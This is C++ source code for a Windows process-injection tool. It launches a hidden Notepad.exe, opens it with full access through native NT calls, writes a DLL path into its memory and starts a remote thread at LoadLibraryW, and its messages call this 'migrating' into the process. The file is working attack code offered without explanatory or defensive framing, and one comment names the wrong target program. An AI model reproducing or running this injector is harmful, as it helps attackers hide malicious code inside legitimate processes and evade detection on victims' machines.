#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include "def.h"
//#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

// Define NT_SUCCESS macro if not already defined
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Define UNICODE_STRING if not already defined
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING* PUNICODE_STRING;

// Define OBJECT_ATTRIBUTES if not already defined
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES* POBJECT_ATTRIBUTES;

// Define CLIENT_ID if not already defined
typedef struct _CLIENT_ID {
    PVOID UniqueProcess;
    PVOID UniqueThread;
} CLIENT_ID;
typedef CLIENT_ID* PCLIENT_ID;

// Macro to initialize OBJECT_ATTRIBUTES
#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}


extern "C" {

    NTSTATUS NTAPI NtOpenProcess(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PCLIENT_ID ClientId
    );

    NTSTATUS NTAPI NtCreateUserProcess(
        PHANDLE ProcessHandle,
        PHANDLE ThreadHandle,
        ACCESS_MASK ProcessDesiredAccess,
        ACCESS_MASK ThreadDesiredAccess,
        POBJECT_ATTRIBUTES ProcessObjectAttributes,
        POBJECT_ATTRIBUTES ThreadObjectAttributes,
        ULONG ProcessFlags,
        ULONG ThreadFlags,
        PVOID ProcessParameters,
        PVOID CreateInfo,
        PVOID AttributeList
    );

    NTSTATUS NTAPI NtAllocateVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );
    VOID NTAPI RtlInitUnicodeString(
        PUNICODE_STRING DestinationString,
        PCWSTR SourceString
    );
    NTSTATUS NTAPI NtClose(
        HANDLE Handle
    );
    NTSTATUS NTAPI NtWriteVirtualMemory(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        ULONG BufferLength,
        PULONG ReturnLength
    );

    NTSTATUS NTAPI NtCreateThreadEx(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes,
        HANDLE ProcessHandle,
        PVOID StartRoutine,
        PVOID Argument,
        ULONG CreateFlags,
        ULONG_PTR ZeroBits,
        SIZE_T StackSize,
        SIZE_T MaximumStackSize,
        PVOID AttributeList
    );
}

DWORD FindProcessId(const std::wstring& processName) {
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    Process32First(hSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile)) {
        CloseHandle(hSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(hSnapshot, &processInfo)) {
        if (!processName.compare(processInfo.szExeFile)) {
            CloseHandle(hSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(hSnapshot);
    return 0;
}

HANDLE OpenTargetProcess(DWORD processId) {
    HANDLE hProcess;
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    CLIENT_ID clientId;
    clientId.UniqueProcess = (HANDLE)(uintptr_t)processId;
    clientId.UniqueThread = 0;

    NTSTATUS status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
    if (!NT_SUCCESS(status)) {
        std::cerr << "[!] Failed to open process. NTSTATUS: " << status << std::endl;
        return NULL;
    }
    return hProcess;
}

PVOID AllocateMemoryInRemoteProcess(HANDLE hProcess, SIZE_T size) {
    PVOID baseAddress = NULL;
    SIZE_T regionSize = size;

    NTSTATUS status = NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        std::cerr << "[!] Failed to allocate memory in remote process. NTSTATUS: " << status << std::endl;
        return NULL;
    }
    return baseAddress;
}

bool WriteMemoryInRemoteProcess(HANDLE hProcess, PVOID baseAddress, const void* buffer, SIZE_T bufferSize) {
    SIZE_T written = 0;
    NTSTATUS status = NtWriteVirtualMemory(hProcess, baseAddress, (PVOID)buffer, bufferSize, (PULONG)&written);
    return NT_SUCCESS(status);
}

bool LoadDllIntoRemoteProcess(HANDLE hProcess, PVOID remoteAddress, const std::wstring& dllPath) {
    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
    if (!hKernel32) {
        std::cerr << "[!] Failed to get handle of kernel32.dll" << std::endl;
        return false;
    }

    PVOID loadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");
    if (!loadLibraryW) {
        std::cerr << "[!] Failed to get address of LoadLibraryW" << std::endl;
        return false;
    }

    HANDLE hThread = NULL;
    NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, loadLibraryW, remoteAddress, FALSE, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) {
        std::cerr << "[!] Failed to create remote thread. NTSTATUS: " << status << std::endl;
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return true;
}

int main(int argc, char* argv[])
{
    
    const std::wstring notepadProcessName = L"Notepad.exe";
    const std::wstring dllPath = L"C:\\temp\\betterdll2.dll";
    
    wchar_t szCmdline[] = L"c:\\Windows\\System32\\Notepad.exe";

    /*
    if (IsProcessElevated()) {
        std::cout << "The process is running with elevated privileges." << std::endl;
        setProcessPrivs(SE_DEBUG_NAME);
    }
    else {
        std::cout << "The process is not running with elevated privileges." << std::endl;
    }
    */

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    //create benign instance of the fax cover page editor executable in System32
    if (!CreateProcess(NULL,        // No module name (use command line)
        szCmdline,   // Command line
        NULL,        // Process handle not inheritable
        NULL,        // Thread handle not inheritable
        FALSE,       // Set handle inheritance to FALSE
        0,           // No creation flags
        NULL,        // Use parent's environment block
        NULL,        // Use parent's starting directory
        &si,         // Pointer to STARTUPINFO structure
        &pi)         // Pointer to PROCESS_INFORMATION structure
        ) {
        std::cerr << "[!] CreateProcess failed (" << GetLastError() << ")." << std::endl;
        return 1;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::cout << "[+] Process created successfully! Sleeping for 3 seconds then migrating into it..." << std::endl;
    Sleep(3000);
    DWORD processId = FindProcessId(notepadProcessName);
    if (processId == 0) {
        std::cerr << "[!] Notepad.exe process not found." << std::endl;
        return 1;
    }
    

  
    HANDLE hProcess = OpenTargetProcess(processId);
    if (!hProcess) {
        std::cerr << "[!]Failed to open the Notepad.exe process" << std::endl;
        return 1;
    }

    PVOID remoteAddress = AllocateMemoryInRemoteProcess(hProcess, (dllPath.size() + 1) * sizeof(wchar_t));
    if (!remoteAddress) {
        CloseHandle(hProcess);
        return 1;
    }

    if (!WriteMemoryInRemoteProcess(hProcess, remoteAddress, dllPath.c_str(), (dllPath.size() + 1) * sizeof(wchar_t))) {
        std::cerr << "[!] Failed to write DLL to the path..." << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    if (!LoadDllIntoRemoteProcess(hProcess, remoteAddress, dllPath)) {
        std::cerr << "[!] Failed to load DLL into Notepad.exe." << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "[+] DLL injected into process Notepad.exe successfully - Migration complete!" << std::endl;
    CloseHandle(hProcess);
    return 0;
}


